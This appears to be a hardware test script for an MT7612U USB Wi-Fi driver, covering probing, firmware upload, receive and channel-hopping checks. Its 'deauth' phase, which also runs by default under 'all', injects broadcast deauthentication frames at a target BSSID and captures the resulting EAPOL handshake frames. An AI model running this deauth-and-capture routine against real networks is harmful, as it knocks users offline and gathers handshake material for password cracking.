"""Hardware test for MT7612U bring-up.

  --phase probe  : USB enumeration + claim + MT_ASIC_VERSION read (M0).
  --phase fw     : probe + FW upload + MCU init + EEPROM (M1+M2).
  --phase rx     : full bring-up + 5s bulk-IN drain on ch 6 (M3+M4).
  --phase hop    : sweep all SUPPORTED_CHANNELS, count APs per channel (M5).
  --phase deauth : inject N deauths targeting --target BSSID and watch for
                   the handshake recapture (M6).
  --phase all    : probe through latest milestone.

Usage:
    .venv/Scripts/python.exe scripts/mt76x2u/test_hw_mt76x2u.py --phase probe
    .venv/Scripts/python.exe scripts/mt76x2u/test_hw_mt76x2u.py --debug
"""
from __future__ import annotations

import argparse
import asyncio
import logging
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

import libusb_package
import usb.core
import usb.util

from wifit3.chips.mt76x2u.constants import (
    MT_MCU_COM_REG0,
    MT76XX_REV_E3,
    USB_IDS_MT76X2U,
)
from wifit3.chips.mt76x2u.driver import MT76x2UDriver
from wifit3.chips.driver import DeviceID


def setup_logging(debug: bool) -> None:
    logging.basicConfig(
        level=logging.DEBUG if debug else logging.INFO,
        format="%(asctime)s.%(msecs)03d [%(levelname)-5s] %(name)s: %(message)s",
        datefmt="%H:%M:%S",
    )


def step(label: str) -> None:
    print(f"\n--- {label} ---")


def ok(msg: str) -> None:
    print(f"[PASS] {msg}")


def fail(msg: str) -> None:
    print(f"[FAIL] {msg}")
    sys.exit(1)


def open_device():
    backend = libusb_package.get_libusb1_backend()
    matched: tuple[int, int, str] | None = None
    dev = None
    for vid, pid, desc in USB_IDS_MT76X2U:
        found = usb.core.find(idVendor=vid, idProduct=pid, backend=backend)
        if found is not None:
            dev = found
            matched = (vid, pid, desc)
            break
    if dev is None:
        fail(
            "No supported MT76x2U device found on USB bus. "
            "Expected one of: "
            + ", ".join(f"{v:04x}:{p:04x}" for v, p, _ in USB_IDS_MT76X2U)
        )
    print(f"[*] Matched device: {matched[2]} ({matched[0]:04x}:{matched[1]:04x})")
    return dev, DeviceID(matched[0], matched[1], matched[2])


def progress(pct: float, msg: str) -> None:
    print(f"  [{pct * 100:5.1f}%] {msg}")


async def phase_probe(driver: MT76x2UDriver) -> None:
    step("PHASE: probe — claim + MT_ASIC_VERSION")
    ok_connect = await driver.connect(progress)
    if not ok_connect:
        fail("driver.connect() returned False")
    if driver.asic_version is None:
        fail("ASIC version was not populated")
    print(f"  ASIC_VERSION raw = 0x{driver.asic_version:08x}")
    print(f"  ASIC rev (low byte) = 0x{driver.asic_rev:02x}")
    if driver.asic_rev >= MT76XX_REV_E3:
        ok(f"Chip is rev E3+ — DLM offset will use the +0x800 adjustment.")
    else:
        ok(f"Chip is pre-E3 — DLM offset stays at 0x110000.")
    # Sanity: top 16 bits should be 0x7612 or 0x7662 strap.
    strap = (driver.asic_version >> 16) & 0xFFFF
    if strap in (0x7612, 0x7662):
        ok(f"Silicon strap 0x{strap:04x} matches MT7612/MT7662 family.")
    else:
        print(f"  WARN: unexpected silicon strap 0x{strap:04x} "
              f"(expected 0x7612 or 0x7662).")


async def phase_fw(driver: MT76x2UDriver) -> None:
    step("PHASE: fw — full connect (FW + MCU init + EEPROM)")
    ok_connect = await driver.connect(progress)
    if not ok_connect:
        fail("driver.connect() returned False")
    com_reg = driver.transport.read32(MT_MCU_COM_REG0)
    print(f"  MT_MCU_COM_REG0 = 0x{com_reg:08x}")
    if com_reg & 0x1:
        ok("FW running (BIT(0) set).")
    else:
        fail("FW NOT running — MT_MCU_COM_REG0 BIT(0) is clear after IVB trigger.")
    if driver.is_warm:
        ok("Driver detected warm-attach (no fresh upload performed).")
    else:
        ok("Driver performed full cold-boot FW upload.")
    if driver.mac_address is None:
        fail("MAC address was not read")
    ok(f"MAC address from EEPROM: {driver.mac_address}")
    print(f"  EEPROM chip ID: 0x{driver.eeprom_chip_id:04x}")
    print(f"  NIC_CONF_0: raw=0x{driver.nic_conf_0['raw']:04x} "
          f"rx={driver.nic_conf_0['rx_path']} tx={driver.nic_conf_0['tx_path']} "
          f"pa_int_2g={driver.nic_conf_0['pa_int_2g']} "
          f"pa_int_5g={driver.nic_conf_0['pa_int_5g']}")
    print(f"  NIC_CONF_1: raw=0x{driver.nic_conf_1['raw']:04x} "
          f"lna_ext_2g={driver.nic_conf_1['lna_ext_2g']} "
          f"lna_ext_5g={driver.nic_conf_1['lna_ext_5g']} "
          f"tx_alc_en={driver.nic_conf_1['tx_alc_en']}")


async def phase_rx(driver: MT76x2UDriver, duration_s: float) -> None:
    step(f"PHASE: rx — full bring-up + {duration_s:.0f}s drain on ch 6")
    ok_connect = await driver.connect(progress)
    if not ok_connect:
        fail("driver.connect() returned False")
    ok(f"Connected (warm={driver.is_warm}). Snapshot of RX-relevant registers:")
    t = driver.transport
    macctl = t.read32(0x1004)             # MT_MAC_SYS_CTRL
    macsts = t.read32(0x1200)             # MT_MAC_STATUS
    rxfltr = t.read32(0x1400)             # MT_RX_FILTR_CFG
    wpdma  = t.read32(0x0208)             # MT_WPDMA_GLO_CFG
    band   = t.read32(0x132C)             # MT_TX_BAND_CFG
    comreg = t.read32(0x0730)             # MT_MCU_COM_REG0
    print(f"  MAC_SYS_CTRL=0x{macctl:08x}  "
          f"(want ENABLE_TX|RX = 0x0c, got bits 2+3={'set' if macctl & 0xc == 0xc else 'NOT BOTH SET'})")
    print(f"  MAC_STATUS  =0x{macsts:08x}  "
          f"(RX bit={(macsts >> 1) & 1})")
    print(f"  RX_FILTR_CFG=0x{rxfltr:08x}  "
          f"(PROMISC clear? bit2={(rxfltr >> 2) & 1}, OTHER_BSS clear? bit3={(rxfltr >> 3) & 1})")
    print(f"  WPDMA_GLO_CFG=0x{wpdma:08x}")
    print(f"  TX_BAND_CFG =0x{band:08x}  (2G={(band >> 2) & 1} 5G={(band >> 1) & 1})")
    print(f"  MCU_COM_REG0=0x{comreg:08x}")

    # Collect parsed beacons into a per-BSSID dict for end-of-run report.
    seen_aps: dict[str, dict] = {}

    def on_parsed(frame: dict) -> None:
        if frame.subtype_id != 8:   # beacon
            return
        bssid = frame.bssid
        if not bssid:
            return
        prev = seen_aps.get(bssid)
        if prev is None or prev["rssi"] < frame.rssi:
            seen_aps[bssid] = {
                "ssid": frame.ssid,
                "rssi": frame.rssi,
                "channel": frame.channel,
            }

    driver.register_rx_callback(on_parsed)

    print(f"\n  Draining EP 0x84 for {duration_s:.0f}s...")
    await asyncio.sleep(duration_s)
    drainer = driver._rx_drainer
    if drainer is None:
        fail("RX drainer is None after connect()")
    print(f"  URBs received: {drainer.rx_count}")
    print(f"  Decoded frames: {drainer.frames_decoded}  "
          f"(dropped: {drainer.frames_dropped})")
    print(f"  Beacons via rxinfo flag: {drainer.beacon_count}")
    if drainer.rx_count == 0:
        fail("No RX URBs received in window — RX path may be deaf.")

    if seen_aps:
        print(f"\n  Distinct APs heard: {len(seen_aps)}")
        for bssid, info in sorted(seen_aps.items(),
                                  key=lambda kv: -kv[1]["rssi"])[:15]:
            ssid = info["ssid"] or "<hidden>"
            ch = info.get("channel") or "?"
            print(f"    {bssid}  rssi={info['rssi']:4d}  ch={ch}  ssid={ssid!r}")
        ok(f"RX path + parser working — heard {len(seen_aps)} unique BSSIDs.")
    else:
        # URBs received but no parsed beacons — RXWI decode or parser is off.
        print("  (no beacons parsed — RXWI decode or WlanFrameParser may need a look)")
        if drainer.first_frame:
            print(f"  First URB len={len(drainer.first_frame)} "
                  f"bytes[:64]={drainer.first_frame[:64].hex()}")
        fail("Got URBs but no beacons parsed.")


async def phase_hop(driver: MT76x2UDriver, dwell_s: float) -> None:
    step(f"PHASE: hop — sweep SUPPORTED_CHANNELS, {dwell_s:.1f}s/channel")
    ok_connect = await driver.connect(progress)
    if not ok_connect:
        fail("driver.connect() returned False")
    ok(f"Connected (warm={driver.is_warm}). Starting sweep.")

    # Per-channel AP table.
    per_chan: dict[int, dict[str, dict]] = {}

    def on_parsed(frame: dict) -> None:
        if frame.subtype_id != 8:
            return
        bssid = frame.bssid
        if not bssid:
            return
        ch = driver.current_channel
        bucket = per_chan.setdefault(ch, {})
        prev = bucket.get(bssid)
        if prev is None or prev["rssi"] < frame.rssi:
            bucket[bssid] = {
                "ssid": frame.ssid,
                "rssi": frame.rssi,
            }

    driver.register_rx_callback(on_parsed)

    import time as _time
    timing: dict[int, float] = {}
    for ch in driver.SUPPORTED_CHANNELS:
        t0 = _time.monotonic()
        if not await driver.set_channel(ch):
            print(f"  ch {ch:3d}: set_channel FAILED")
            continue
        switch_ms = (_time.monotonic() - t0) * 1000
        timing[ch] = switch_ms
        await asyncio.sleep(dwell_s)
        seen = len(per_chan.get(ch, {}))
        print(f"  ch {ch:3d}: switch={switch_ms:6.1f}ms  APs={seen}")

    print(f"\n  Sweep complete.")
    total_aps_per_chan = sum(len(b) for b in per_chan.values())
    if total_aps_per_chan == 0:
        fail("Sweep heard zero APs total.")

    # Roll up to UNIQUE BSSIDs across all channels.
    unique: dict[str, dict] = {}
    for ch, bucket in per_chan.items():
        for bssid, info in bucket.items():
            cur = unique.setdefault(bssid, {
                "ssid": info["ssid"], "rssi": info["rssi"],
                "channels": set(),
            })
            cur["channels"].add(ch)
            if info["rssi"] > cur["rssi"]:
                cur["rssi"] = info["rssi"]
                cur["ssid"] = info["ssid"]

    # First-octet distribution — real-world MACs have locally-administered
    # bit (BIT 1 of byte 0) set commonly, multicast (BIT 0) almost never;
    # if we're hallucinating from noise the histogram should be uniform.
    from collections import Counter
    first_octet_hist = Counter(int(b.split(":")[0], 16) for b in unique)
    multicast_count = sum(c for o, c in first_octet_hist.items() if o & 1)

    band_2g_unique = sum(1 for b in unique.values()
                         if any(ch < 36 for ch in b["channels"]))
    band_5g_unique = sum(1 for b in unique.values()
                         if any(ch >= 36 for ch in b["channels"]))

    print(f"  Per-channel rows (with duplicates): {total_aps_per_chan}")
    print(f"  UNIQUE BSSIDs across all channels:  {len(unique)}")
    print(f"  Multicast first-octet (BIT0 set):   {multicast_count} "
          f"(should be 0 if frames are real)")
    print(f"  2.4 GHz unique: {band_2g_unique}, 5 GHz unique: {band_5g_unique}")

    print(f"\n  Top 20 unique BSSIDs by RSSI:")
    for bssid, info in sorted(unique.items(),
                              key=lambda kv: -kv[1]["rssi"])[:20]:
        chans = sorted(info["channels"])
        chan_str = ",".join(str(c) for c in chans)
        print(f"    {bssid}  rssi={info['rssi']:4d}  chans=[{chan_str}]  "
              f"ssid={info['ssid']!r}")

    if multicast_count > len(unique) // 4:
        print("\n  WARN: lots of multicast first-octets — probably "
              "parsing garbage. Investigate before celebrating.")
    ok(f"Sweep done — {len(unique)} unique BSSIDs heard "
       f"(2.4 GHz: {band_2g_unique}, 5 GHz: {band_5g_unique}).")


async def phase_deauth(driver: MT76x2UDriver, target: str,
                       count: int, dwell_s: float) -> None:
    step(f"PHASE: deauth — {count}x broadcast deauth on BSSID {target}")
    if ":" not in target or len(target.split(":")) != 6:
        fail(f"--target must be BSSID like aa:bb:cc:dd:ee:ff, got {target!r}")
    bssid_bytes = bytes(int(b, 16) for b in target.split(":"))

    ok_connect = await driver.connect(progress)
    if not ok_connect:
        fail("driver.connect() returned False")

    # Watch for any subsequent EAPOL frames (handshake recapture proof).
    eapol_count = 0
    handshake_frames = []

    def on_parsed(frame: dict) -> None:
        nonlocal eapol_count
        if frame.type == "eapol":
            eapol_count += 1
            handshake_frames.append({
                "bssid": frame.bssid,
                "src": frame.source,
                "dst": frame.dest,
                "rssi": frame.rssi,
            })

    driver.register_rx_callback(on_parsed)

    # Broadcast deauth: target = ff:ff:ff:ff:ff:ff (all clients), BSSID = AP.
    bcast = b"\xff" * 6
    from wifit3.chips.mt76x2u.tx import build_deauth, assemble_tx_frame
    frame = build_deauth(bcast, bssid_bytes, reason=7, from_ap=True)
    blob = assemble_tx_frame(frame, ack=False)
    print(f"  Deauth on-wire: TXINFO+TXWI+frame+pad = {len(blob)} bytes")
    print(f"  Frame bytes:    {frame.hex()}")

    for i in range(count):
        if not await driver.inject_frame(frame):
            fail(f"inject_frame failed on attempt {i + 1}")
        await asyncio.sleep(0.05)
    ok(f"Sent {count} deauth frames.")

    print(f"\n  Waiting {dwell_s:.0f}s for potential handshake recapture...")
    await asyncio.sleep(dwell_s)

    drainer = driver._rx_drainer
    print(f"  RX during window: {drainer.rx_count} URBs, "
          f"{drainer.frames_decoded} decoded")
    print(f"  EAPOL frames seen: {eapol_count}")
    for h in handshake_frames[:8]:
        print(f"    bssid={h['bssid']} src={h['src']} dst={h['dst']} rssi={h['rssi']}")
    if eapol_count == 0:
        print("  (no EAPOL — clients may have stayed associated or not reconnected)")
    else:
        ok(f"Recaptured {eapol_count} EAPOL frames — deauth worked end-to-end.")


async def main_async(args: argparse.Namespace) -> None:
    setup_logging(args.debug)
    dev, id_entry = open_device()
    driver = MT76x2UDriver.from_usb_device(dev, id_entry)

    try:
        if args.phase == "probe":
            # probe-only path: bypass connect() so we don't trigger FW upload.
            step("PHASE: probe — claim + MT_ASIC_VERSION (no FW upload)")
            try:
                driver._claim_interface()
                driver.transport.assert_expected_endpoints()
                driver.asic_version = driver.transport.read32(0x0000)
                driver.asic_rev = driver.asic_version & 0xFF
            except Exception as e:
                fail(f"probe failed: {e}")
            print(f"  ASIC_VERSION raw = 0x{driver.asic_version:08x}")
            print(f"  ASIC rev (low byte) = 0x{driver.asic_rev:02x}")
            if driver.asic_rev >= MT76XX_REV_E3:
                ok("Chip is rev E3+ — DLM offset will use the +0x800 adjustment.")
            else:
                ok("Chip is pre-E3 — DLM offset stays at 0x110000.")
            strap = (driver.asic_version >> 16) & 0xFFFF
            if strap in (0x7612, 0x7662):
                ok(f"Silicon strap 0x{strap:04x} matches MT7612/MT7662 family.")
            else:
                print(f"  WARN: unexpected silicon strap 0x{strap:04x}.")
        elif args.phase == "fw":
            await phase_fw(driver)
        elif args.phase == "rx":
            await phase_rx(driver, args.duration)
        elif args.phase == "hop":
            await phase_hop(driver, args.dwell)
        elif args.phase in ("deauth", "all"):
            await phase_deauth(driver, args.target, args.count, args.duration)
        else:
            fail(f"Unknown phase: {args.phase}")
    finally:
        await driver.close()

    print("\n[+] All requested phases passed.")


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    p.add_argument("--phase", default="all",
                   choices=("probe", "fw", "rx", "hop", "deauth", "all"),
                   help="Which phase to run (default: all)")
    p.add_argument("--duration", type=float, default=5.0,
                   help="RX drain window in seconds (default 5)")
    p.add_argument("--dwell", type=float, default=1.5,
                   help="Per-channel dwell time for --phase hop (default 1.5)")
    p.add_argument("--target", type=str, default="aa:bb:cc:dd:ee:01",
                   help="BSSID for --phase deauth (default: your AP)")
    p.add_argument("--count", type=int, default=10,
                   help="Number of deauths to inject (default 10)")
    p.add_argument("--debug", action="store_true",
                   help="Enable DEBUG logging")
    args = p.parse_args()

    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        return 130
    return 0


if __name__ == "__main__":
    sys.exit(main())
